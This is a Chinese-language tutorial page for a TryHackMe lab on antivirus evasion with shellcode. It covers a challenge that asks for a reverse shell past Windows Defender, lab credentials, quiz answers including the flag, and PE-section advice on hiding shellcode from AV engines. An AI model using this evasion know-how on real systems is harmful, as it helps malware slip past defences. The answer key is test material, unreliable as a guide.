<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Host Evasions/avevasionshellcode" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">AV 规避：Shellcode | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" property="og:locale:alternate" content="en"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="AV 规避：Shellcode | TryHackMe-CN"><meta data-rh="true" name="description" content="任务1 简介"><meta data-rh="true" property="og:description" content="任务1 简介"><link data-rh="true" rel="icon" href="/TryHackMe-CN/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"模块","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/"},{"@type":"ListItem","position":2,"name":"主机规避","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/"},{"@type":"ListItem","position":3,"name":"AV 规避：Shellcode","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/assets/js/runtime~main.ae094ceb.js" defer="defer"></script>
<script src="/TryHackMe-CN/assets/js/main.4139ffc9.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/"><div class="navbar__logo"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>简体中文</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Host Evasions/avevasionshellcode" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/docs/Modules/"><span title="模块" class="categoryLinkLabel_W154">模块</span></a><button aria-label="折叠侧边栏分类 &#x27;模块&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Attacking LLMs/"><span title="攻击大型语言模型" class="categoryLinkLabel_W154">攻击大型语言模型</span></a><button aria-label="展开侧边栏分类 &#x27;攻击大型语言模型&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Command Line/"><span title="命令行" class="categoryLinkLabel_W154">命令行</span></a><button aria-label="展开侧边栏分类 &#x27;命令行&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/"><span title="容器安全" class="categoryLinkLabel_W154">容器安全</span></a><button aria-label="展开侧边栏分类 &#x27;容器安全&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/docs/Modules/Host Evasions/"><span title="主机规避" class="categoryLinkLabel_W154">主机规避</span></a><button aria-label="折叠侧边栏分类 &#x27;主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode"><span title="AV 规避：Shellcode" class="linkLabel_WmDU">AV 规避：Shellcode</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Host Evasions/obfuscationprinciples"><span title="混淆原理" class="linkLabel_WmDU">混淆原理</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Memory Analysis/"><span title="内存分析" class="categoryLinkLabel_W154">内存分析</span></a><button aria-label="展开侧边栏分类 &#x27;内存分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="展开侧边栏分类 &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Starters/"><span title="入门挑战" class="categoryLinkLabel_W154">入门挑战</span></a><button aria-label="展开侧边栏分类 &#x27;入门挑战&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/docs/Networks/"><span title="网络" class="categoryLinkLabel_W154">网络</span></a><button aria-label="展开侧边栏分类 &#x27;网络&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/TryHackMe-CN/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/"><span>模块</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/Host Evasions/"><span>主机规避</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">AV 规避：Shellcode</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>AV 规避：Shellcode</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务1-简介">任务1 简介<a href="#任务1-简介" class="hash-link" aria-label="任务1 简介的直接链接" title="任务1 简介的直接链接" translate="no">​</a></h2>
<p>在本房间中，我们将探讨如何构建和交付有效载荷，重点在于避免被常见 AV 引擎检测到。 我们将研究作为攻击者可用的不同技术，并讨论每种技术的优缺点。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="目标">目标<a href="#目标" class="hash-link" aria-label="目标的直接链接" title="目标的直接链接" translate="no">​</a></h3>
<ul>
<li class="">了解 shellcode 是如何制作的。</li>
<li class="">探索分阶段有效载荷的优缺点。</li>
<li class="">创建隐蔽的 shellcode 以避免 AV 检测。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="先决条件">先决条件<a href="#先决条件" class="hash-link" aria-label="先决条件的直接链接" title="先决条件的直接链接" translate="no">​</a></h3>
<p>建议事先了解一些<a href="https://tryhackme.com/room/introtoav" target="_blank" rel="noopener noreferrer" class="">防病毒软件的工作原理</a>知识，并对加密和编码有基本理解。 虽然不是严格要求，但了解一些基本汇编语言也会有所帮助。 此外，我们建议对阅读代码和理解函数（C、C#）有基本了解。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击并继续学习！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-2-挑战">任务 2 挑战<a href="#任务-2-挑战" class="hash-link" aria-label="任务 2 挑战的直接链接" title="任务 2 挑战的直接链接" translate="no">​</a></h2>
<p>在此挑战中，我们准备了一台 Windows 机器，带有一个 Web 应用程序，供您上传有效载荷。 一旦上传，有效载荷将由 AV 检查，如果发现没有恶意软件，则会被执行。 此挑战的主要目标是规避 VM 上安装的防病毒软件，并捕获文件系统中的标志。 请随意尝试本房间讨论的所有技术，将它们上传到 <code>http://MACHINE_IP/</code>。</p>
<p>需记住的要点：</p>
<ul>
<li class="">尝试结合本房间讨论的技术。</li>
<li class="">该网站仅支持 EXE 文件。</li>
<li class="">一旦 AV 扫描上传的文件且未检测到恶意代码，文件就会被执行。 因此，如果一切正确组合，您应该会收到一个反向 shell。</li>
</ul>
<p><img decoding="async" loading="lazy" alt="AV Challenge Web App" src="/TryHackMe-CN/assets/images/image_20251141-214152-b953a19b6109ea2253047988d2567d1d.png" width="829" height="757" class="img_ev3q"></p>
<p>您现在可以忽略此任务的问题，但请务必在成功绕过 AV 并获得 shell 后返回回答它们。</p>
<p>部署附加的 VM 以跟进房间内容，然后再继续下一部分！ VM 将在浏览器中部署，并应自动出现在分屏视图中。 如果 VM 不可见，请使用页面右上角的蓝色显示分屏视图按钮。 如果您更喜欢通过 RDP 连接，可以使用以下凭据：</p>
<table><thead><tr><th style="text-align:center">Key</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">用户名</td><td style="text-align:center">thm</td></tr><tr><td style="text-align:center">密码</td><td style="text-align:center">Password321</td></tr></tbody></table>
<p>您还需要 AttackBox 来完成某些任务，因此这也是启动它的好时机。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> VM 上运行的是哪种防病毒软件？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Windows Defender</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 您可以访问的用户帐户名称是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">av-victim</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 在受害机器上建立一个可用的 shell 并读取用户桌面上的文件。 标志是什么？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{H3ll0-W1nD0ws-Def3nd3r!}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-3-pe-结构">任务 3 PE 结构<a href="#任务-3-pe-结构" class="hash-link" aria-label="任务 3 PE 结构的直接链接" title="任务 3 PE 结构的直接链接" translate="no">​</a></h2>
<p>本任务重点介绍 Windows 二进制文件 PE 数据结构的一些高级基本元素。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="什么是-pe">什么是 PE？<a href="#什么是-pe" class="hash-link" aria-label="什么是 PE？的直接链接" title="什么是 PE？的直接链接" translate="no">​</a></h3>
<p>Windows 可执行文件格式，又称 PE（可移植可执行文件），是一种包含文件必要信息的数据结构。 它是一种在磁盘上组织可执行文件代码的方式。 Windows 操作系统组件，如 Windows 和 DOS 加载器，可以将其加载到内存中，并根据在 PE 中找到的解析文件信息执行它。</p>
<p>通常，Windows 二进制文件（如 EXE、DLL 和对象代码文件）的默认文件结构具有相同的 PE 结构，并在 Windows 操作系统中适用于（x86 和 x64）CPU 架构。</p>
<p>PE 结构包含各种部分，这些部分保存有关二进制文件的信息，例如元数据和外部库内存地址的链接。 其中一个部分是 <strong>PE 头</strong>，它包含元数据信息、指针以及内存中地址部分的链接。 另一个部分是 <strong>数据部分</strong>，它包括包含 Windows 加载器运行程序所需信息的容器，例如可执行代码、资源、库链接、数据变量等。</p>
<p><img decoding="async" loading="lazy" alt="PE Structure" src="/TryHackMe-CN/assets/images/image_20251145-214539-9b952f0ac4f79fd84f8fb336a6f2f1d7.png" width="762" height="555" class="img_ev3q"></p>
<p>PE 结构中有不同类型的数据容器，每个容器保存不同的数据。</p>
<ol>
<li class=""><strong>.text</strong> 存储程序的实际代码</li>
<li class=""><strong>.data</strong> 保存已初始化和定义的变量</li>
<li class=""><strong>.bss</strong> 保存未初始化的数据（已声明但未赋值的变量）</li>
<li class=""><strong>.rdata</strong> 包含只读数据</li>
<li class=""><strong>.edata</strong> 包含可导出对象及相关表信息</li>
<li class=""><strong>.idata</strong> 导入的对象及相关表信息</li>
<li class=""><strong>.reloc</strong> 映像重定位信息</li>
<li class=""><strong>.rsrc</strong> 链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，其中包含有关程序版本、作者、公司和版权的所有信息！</li>
</ol>
<p>PE 结构是一个广泛而复杂的主题，我们不会过多涉及头和数据部分的细节。 本任务提供了 PE 结构的高级概述。 如果您有兴趣获取有关该主题的更多信息，我们建议查看以下 THM 房间，其中更详细地解释了该主题：</p>
<ul>
<li class=""><a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer" class="">Windows Internals</a></li>
<li class="">剖析 PE 头</li>
</ul>
<p>如果您查看 <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener noreferrer" class="">Windows PE 格式</a>的文档网站，也可以获得更深入的 PE 细节。</p>
<p>查看 PE 内容时，我们会看到它包含一堆人类不可读的字节。 但是，它包含了加载器运行文件所需的所有细节。 以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的示例步骤。</p>
<ol>
<li class="">头部分：解析 DOS、Windows 和可选头以提供有关 EXE 文件的信息。 例如，<!-- -->
<ul>
<li class="">幻数以 &quot;MZ&quot; 开头，这告诉加载器这是一个 EXE 文件。</li>
<li class="">文件签名</li>
<li class="">文件是为 x86 还是 x64 CPU 架构编译的。</li>
<li class="">创建时间戳。</li>
</ul>
</li>
<li class="">解析节表细节，例如<!-- -->
<ul>
<li class="">文件包含的节数。</li>
</ul>
</li>
<li class="">基于入口点地址和映像基址的偏移量将文件内容映射到内存中。<!-- -->
<ul>
<li class="">入口点地址和映像基址的偏移量。</li>
<li class="">RVA：相对虚拟地址，与映像基址相关的地址。</li>
</ul>
</li>
<li class="">导入项、DLL和其他对象被加载到内存中。</li>
<li class="">定位入口点地址并运行主执行函数。</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="为什么我们需要了解pe">为什么我们需要了解PE？<a href="#为什么我们需要了解pe" class="hash-link" aria-label="为什么我们需要了解PE？的直接链接" title="为什么我们需要了解PE？的直接链接" translate="no">​</a></h3>
<p>我们需要学习它有几个原因。 首先，由于我们处理的是打包和解包主题，该技术需要有关PE结构的详细信息。</p>
<p>另一个原因是AV软件和恶意软件分析师根据PE头和其他PE部分中的信息分析EXE文件。 因此，要创建或修改具有针对Windows机器的AV规避能力的恶意软件，我们需要了解Windows可移植可执行文件的结构以及恶意shellcode可以存储的位置。</p>
<p>我们可以通过如何定义和初始化shellcode变量来控制将shellcode存储在哪个数据部分。 以下是一些示例，展示我们如何在PE中存储shellcode：</p>
<ul>
<li class="">将shellcode定义为主函数内的局部变量将将其存储在** .TEXT ** PE部分中。</li>
<li class="">将shellcode定义为全局变量将将其存储在** .Data **部分中。</li>
<li class="">另一种技术涉及将shellcode作为原始二进制存储在图标图像中，并在代码中链接它，因此在这种情况下，它会出现在** .rsrc **数据部分中。</li>
<li class="">我们可以添加自定义数据部分来存储shellcode。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pe-bear">PE-Bear<a href="#pe-bear" class="hash-link" aria-label="PE-Bear的直接链接" title="PE-Bear的直接链接" translate="no">​</a></h3>
<p>附加的VM是一个Windows开发机器，具有解析EXE文件和读取我们讨论的详细信息所需的工具。 为方便起见，我们在桌面上提供了PE-Bear软件的副本，它有助于检查PE结构：头、部分等。 PE-Bear提供了一个图形用户界面来显示所有相关的EXE详细信息。 要加载EXE文件进行分析，请选择<strong>File</strong> -&gt; <strong>Load PEs</strong> (Ctrl + O)。</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear: 主窗口" src="/TryHackMe-CN/assets/images/image_20251149-214931-254dc3c9b34342193396d3c17848997c.png" width="607" height="446" class="img_ev3q"></p>
<p>一旦文件被加载，我们可以看到所有PE详细信息。 以下屏幕截图显示了加载文件的PE详细信息，包括我们在本任务前面讨论的头和部分。</p>
<p><img decoding="async" loading="lazy" alt="PE-Bear: 加载文件" src="/TryHackMe-CN/assets/images/image_20251149-214947-56046571da1f23011e1aec353a8da742.png" width="809" height="466" class="img_ev3q"></p>
<p>现在是时候尝试一下了！ 加载<strong>thm-intro2PE.exe</strong>文件以回答以下问题。 该文件位于以下位置：<code>c:\Tools\PE files\thm-intro2PE.exe</code>。</p>
